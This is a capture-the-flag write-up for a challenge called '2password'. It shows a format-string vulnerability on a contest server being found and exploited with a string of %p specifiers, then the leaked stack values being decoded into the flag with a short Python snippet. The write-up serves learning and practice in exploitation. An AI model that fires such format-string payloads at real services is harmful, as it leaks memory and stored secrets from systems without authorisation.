### Challenge Hint  
We are given the hint:  
```
2Password > 1Password
```  

### Initial Exploration  
We connect to the challenge server using:  
```
nc chall.lac.tf 31142
```
The server prompts us for a username, followed by two passwords.  

After testing a few inputs, I noticed that incorrect attempts resulted in:  
```
Incorrect password for test
```
(where "test" was the username I provided).  

To analyze the input handling, I experimented with different lengths of input and discovered that each buffer is **40 bytes large**.  

### Leaking Memory with Format String Vulnerability  
I attempted to print memory addresses using `%p`, which reveals values stored on the stack:  
```
%p%p%p%p%p%p%p%p%p%p%pv%p%p%p%p%p%p%p%p%p%p%p%p%p
```
Upon running this exploit:  
```
metju@swagbook:~/lactf25/2password$ nc chall.lac.tf 31142
Enter username: %p%p%p%p%p%p%p%p%p%p%pv%p%p%p%p%p%p%p%p%p%p%p%p%p
Enter password1: 
Enter password2: test
Incorrect password for user 0x7ffdc07ce530(nil)(nil)0x595dda4164a8(nil)0x75687b667463616c0x66635f327265746e0x7d38367a783063(nil)(nil)(nil)v0x74736574(nil)(nil)(nil)(nil)(nil)0x7025702570257025(nil)(nil)
```
From the output, we can assume:  
- The **first leaked hex value** is the username.  
- A **40-byte gap** follows.  
- Then, we see **three consecutive hex values**, which seem to represent a buffer containing both passwords.  

### Extracting and Decoding the Flag  
The leaked values are:  
```
0x75687b667463616c  
0x66635f327265746e  
0x7d38367a783063  
```
Converting them from hex and reversing their byte order:  
```python
leaked_bytes = [
    '0x75687b667463616c',
    '0x66635f327265746e',
    '0x7d38367a783063'
]

flag = "".join([bytes.fromhex(h[2:]).decode()[::-1] for h in leaked_bytes])

print(flag)
```
This reveals the flag! 